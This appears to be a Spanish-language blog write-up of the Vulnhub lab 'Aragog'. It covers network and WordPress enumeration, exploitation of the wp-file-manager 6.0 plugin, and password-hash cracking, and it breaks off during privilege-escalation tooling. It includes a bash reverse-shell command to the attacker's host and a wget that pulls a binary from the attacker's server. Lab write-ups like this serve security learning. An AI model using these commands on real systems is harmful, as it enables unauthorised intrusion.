<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=4444&amp;path=livereload" data-no-instant defer></script>

	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />

	<title>aragog - Vulnhub (easy) |  fafi </title>

	<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />

</head>

<body>

<header class="site-header">

<nav>
  <div>
    <a href="/" class="title">
          
            fafi 
          
    </a>
  </div>
  
  
  <div class="sections">
            
            
            
            
            <a  href="/" title="">Home</a>
            
            
            <a  href="/writeups/" title="">Writeups</a>
            
            
            <a  href="/labs/" title="">labs</a>
            
            
            <a  href="/sisops/" title="">Sisops</a>
            
            
            <a  href="/networking/" title="">Networking</a>
            
  </div>

</nav>

</header>





<div class="single-content">
    
    <h3 class="single-content-title">aragog - Vulnhub (easy)</h3>

    <h2 id="escaneo-de-red-con-nmap-para-descubrir-máquina-objetivo">Escaneo de red con nmap para descubrir máquina objetivo</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.38.1.0/24
</span></span></code></pre></div><p><img src="/images/writeups/vulnhub/aragog/nmaphd.png" alt="nmap host discovery"></p>
<h3 id="la-ip-de-la-máquina-objetivo-es-1038112">La IP de la máquina objetivo es <strong>10.38.1.12</strong></h3>
<h2 id="escaneo-de-la-máquina-objetivo-en-busca-de-puertos-abiertos">Escaneo de la máquina objetivo en busca de puertos abiertos</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p- --open -sS --min-rate <span style="color:#bd93f9">5000</span> -vvv -n -Pn 10.38.1.12 -oN target_scan.nmap
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Host discovery disabled <span style="color:#ff79c6">(</span>-Pn<span style="color:#ff79c6">)</span>. All addresses will be marked <span style="color:#f1fa8c">&#39;up&#39;</span> and scan <span style="color:#8be9fd;font-style:italic">times</span> may be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2024-03-29 12:38 EDT
</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 12:38
</span></span><span style="display:flex;"><span>Scanning 10.38.1.12 <span style="color:#ff79c6">[</span><span style="color:#bd93f9">1</span> port<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 12:38, 0.05s elapsed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> total hosts<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:38
</span></span><span style="display:flex;"><span>Scanning 10.38.1.12 <span style="color:#ff79c6">[</span><span style="color:#bd93f9">65535</span> ports<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.38.1.12
</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.38.1.12
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:38, 1.20s elapsed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">65535</span> total ports<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.38.1.12
</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#ff79c6">(</span>0.000088s latency<span style="color:#ff79c6">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2024-03-29 12:38:57 EDT <span style="color:#ff79c6">for</span> 1s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">65533</span> closed tcp ports <span style="color:#ff79c6">(</span>reset<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#bd93f9">64</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#bd93f9">64</span>
</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:D5:C7:2A <span style="color:#ff79c6">(</span>Oracle VirtualBox virtual NIC<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 1.47 seconds
</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#bd93f9">65536</span> <span style="color:#ff79c6">(</span>2.884MB<span style="color:#ff79c6">)</span> | Rcvd: <span style="color:#bd93f9">65536</span> <span style="color:#ff79c6">(</span>2.621MB<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><h3 id="puertos-abiertos-2280"><strong>Puertos Abiertos: 22,80</strong></h3>
<h2 id="ejecución-de-scripts-con-nmap">Ejecución de scripts con nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sCV -p22,80 10.38.1.12 -oN scripts_exec.nmap
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2024-03-29 12:46 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.38.1.12
</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.00068s latency<span style="color:#ff79c6">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">2048</span> 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">256</span> 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#bd93f9">256</span> 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.38 <span style="color:#ff79c6">((</span>Debian<span style="color:#ff79c6">))</span>
</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title <span style="color:#ff79c6">(</span>text/html<span style="color:#ff79c6">)</span>.
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.38 <span style="color:#ff79c6">(</span>Debian<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:D5:C7:2A <span style="color:#ff79c6">(</span>Oracle VirtualBox virtual NIC<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 20.67 seconds
</span></span></code></pre></div><h2 id="dominio-y-subdominio-agregado-a-etchosts">Dominio y subdominio agregado a /etc/hosts</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.38.1.12 aragog.vhb
</span></span><span style="display:flex;"><span>10.38.1.12 wordpress.aragog.hogwarts
</span></span></code></pre></div><h2 id="enumeración-de-directorios-con-gobuster">Enumeración de directorios con gobuster</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://wordpress.aragog.hogwarts/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.text
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@firefart<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:                     http://wordpress.aragog.hogwarts/
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:                 <span style="color:#bd93f9">10</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Negative Status codes:   <span style="color:#bd93f9">404</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:                 <span style="color:#8be9fd;font-style:italic">10s</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#8be9fd;font-style:italic">mode</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
</span></span><span style="display:flex;"><span>/blog                 <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 337<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://wordpress.aragog.hogwarts/blog/<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>/javascript           <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 343<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://wordpress.aragog.hogwarts/javascript/<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>/server-status        <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 290<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#bd93f9">220560</span> / <span style="color:#bd93f9">220561</span> <span style="color:#ff79c6">(</span>100.00%<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Finished</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
</span></span></code></pre></div><h2 id="enumeración-de-plugins-con-wpscan">Enumeración de plugins con wpscan</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         __          _______   _____
</span></span><span style="display:flex;"><span>         <span style="color:#f1fa8c">\ \ </span>       / /  __ <span style="color:#f1fa8c">\ </span>/ ____|
</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">\ \ </span> /<span style="color:#f1fa8c">\ </span> / /| |__<span style="color:#ff79c6">)</span> | <span style="color:#ff79c6">(</span>___   ___  __ _ _ __ ®
</span></span><span style="display:flex;"><span>           <span style="color:#f1fa8c">\ \/</span>  <span style="color:#f1fa8c">\/</span> / |  ___/ <span style="color:#f1fa8c">\_</span>__ <span style="color:#f1fa8c">\ </span>/ __|/ _<span style="color:#f1fa8c">`</span> | <span style="color:#f1fa8c">&#39;_ \
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            \  /\  /  | |     ____) | (__| (_| | | | |
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">         WordPress Security Scanner by the WPScan Team
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                         Version 3.8.25
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">       Sponsored by Automattic - https://automattic.com/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_______________________________________________________________
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] URL: http://wordpress.aragog.hogwarts/blog/ [10.38.1.12]
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] Started: Fri Mar 29 13:16:47 2024
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Interesting Finding(s):
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] Headers
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Interesting Entry: Server: Apache/2.4.38 (Debian)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Headers (Passive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Confidence: 100%
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] XML-RPC seems to be enabled: http://wordpress.aragog.hogwarts/blog/xmlrpc.php
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Confidence: 100%
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | References:
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] WordPress readme found: http://wordpress.aragog.hogwarts/blog/readme.html
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Confidence: 100%
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] The external WP-Cron seems to be enabled: http://wordpress.aragog.hogwarts/blog/wp-cron.php
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Confidence: 60%
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | References:
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - https://github.com/wpscanteam/wpscan/issues/1299
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Rss Generator (Passive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - http://wordpress.aragog.hogwarts/blog/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.0.12&lt;/generator&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - http://wordpress.aragog.hogwarts/blog/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.0.12&lt;/generator&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[+] WordPress theme in use: twentynineteen
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Location: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Last Updated: 2023-11-07T00:00:00.000Z
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/readme.txt
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | [!] The version is out of date, the latest version is 2.7
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Style URL: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Style Name: Twenty Nineteen
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Style URI: https://github.com/WordPress/twentynineteen
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Author: the WordPress team
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Author URI: https://wordpress.org/
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Css Style In Homepage (Passive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Version: 1.2 (80% confidence)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> | Found By: Style (Passive Detection)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> |  - http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2, Match: &#39;</span>Version: 1.2&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Enumerating All Plugins <span style="color:#ff79c6">(</span>via Aggressive Methods<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span> Checking Known Locations - Time: 00:02:11 &lt;<span style="color:#ff79c6">====================================</span>&gt; <span style="color:#ff79c6">(</span><span style="color:#bd93f9">104994</span> / 104994<span style="color:#ff79c6">)</span> 100.00% Time: 00:02:11
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Checking Plugin Versions <span style="color:#ff79c6">(</span>via Aggressive Methods<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> Plugin<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> akismet
</span></span><span style="display:flex;"><span> | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/
</span></span><span style="display:flex;"><span> | Latest Version: 5.3.2
</span></span><span style="display:flex;"><span> | Last Updated: 2024-03-21T00:55:00.000Z
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/, status: <span style="color:#bd93f9">500</span>
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | The version could not be determined.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> wp-file-manager
</span></span><span style="display:flex;"><span> | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/
</span></span><span style="display:flex;"><span> | Last Updated: 2024-03-15T05:29:00.000Z
</span></span><span style="display:flex;"><span> | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt
</span></span><span style="display:flex;"><span> | <span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> The version is out of date, the latest version is 7.2.5
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/, status: <span style="color:#bd93f9">200</span>
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Version: 6.0 <span style="color:#ff79c6">(</span>100% confidence<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span> | Found By: Readme - Stable Tag <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt
</span></span><span style="display:flex;"><span> | Confirmed By: Readme - ChangeLog Section <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span> |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> You can get a free API token with <span style="color:#bd93f9">25</span> daily requests by registering at https://wpscan.com/register
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Finished: Fri Mar <span style="color:#bd93f9">29</span> 13:19:13 <span style="color:#bd93f9">2024</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Requests Done: <span style="color:#bd93f9">105004</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Cached Requests: <span style="color:#bd93f9">38</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Data Sent: 31.394 MB
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Data Received: 14.067 MB
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Memory used: 442.559 MB
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Elapsed time: 00:02:26
</span></span></code></pre></div><h2 id="ejecución-de-exploit-encontrado-con-searchsploit">Ejecución de exploit encontrado con searchsploit</h2>
<p><em>wp-file-manager 6.0</em></p>
<p><img src="/images/writeups/vulnhub/aragog/searchsploit.png" alt="searchsploit wp-file-manager"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 wp_file_manager_exploit.py http://aragog.vhb/blog  <span style="color:#f1fa8c">&#34;/bin/bash -c &#39;bash -i &gt;/dev/tcp/10.38.1.10/4444 0&gt;&amp;1&#39;&#34;</span>
</span></span></code></pre></div><h2 id="buscando-servicios-que-corren-en-la-máquina-objetivo-se-encuentra-mysql">Buscando servicios que corren en la máquina objetivo se encuentra mysql</h2>
<p><img src="/images/writeups/vulnhub/aragog/mysqlrunning.png" alt="servicio mysql"></p>
<h2 id="credenciales-para-conectarse-a-mysql-encontradas-en-etcwordpress">Credenciales para conectarse a mysql encontradas en /etc/wordpress</h2>
<p><img src="/images/writeups/vulnhub/aragog/credentials.png" alt="Credenciales mysql"></p>
<h2 id="credenciales-encontradas-para-usuario-hagrid98-en-una-base-de-datos">Credenciales encontradas para usuario hagrid98 en una base de datos</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span>| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span>|  <span style="color:#bd93f9">1</span> | hagrid98   | <span style="color:#8be9fd;font-style:italic">$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc</span>. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           <span style="color:#bd93f9">0</span> | WP-Admin     |
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
</span></span></code></pre></div><h2 id="cracking-de-contraseña-encontrada-con-john">Cracking de contraseña encontrada con john</h2>
<p><img src="/images/writeups/vulnhub/aragog/passhagrid.png" alt="cracking john"></p>
<h2 id="flag-del-usuario-hagrid98">Flag del usuario hagrid98</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hagrid98@Aragog:~$ ls
</span></span><span style="display:flex;"><span>horcrux1.txt
</span></span><span style="display:flex;"><span>hagrid98@Aragog:~$ cat horcrux1.txt 
</span></span><span style="display:flex;"><span>horcrux_<span style="color:#ff79c6">{</span><span style="color:#8be9fd;font-style:italic">MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw</span><span style="color:#ff79c6">==}</span>
</span></span></code></pre></div><h2 id="transferencia-de-pspy64-a-máquina-objetivo">Transferencia de pspy64 a máquina objetivo</h2>
<h3 id="activo-un-servidor-http-con-python-desde-mi-máquina-para-hacer-un-wget-y-copiar-el-binario-ejecutable-pspy64-a-la-máquina-objetivo">Activo un servidor http con python desde mi máquina para hacer un wget y copiar el binario ejecutable pspy64 a la máquina objetivo</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hagrid98@Aragog:/tmp$ wget http://10.38.1.10:8080/pspy64
</span></span><span style="display:flex;"><span>--2024-03-30 00:46:45--  http://10.38.1.10:8080/pspy64
</span></span><span style="display:flex;"><span>Connecting to 10.38.1.10:8080... connected.
</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#bd93f9">200</span> OK
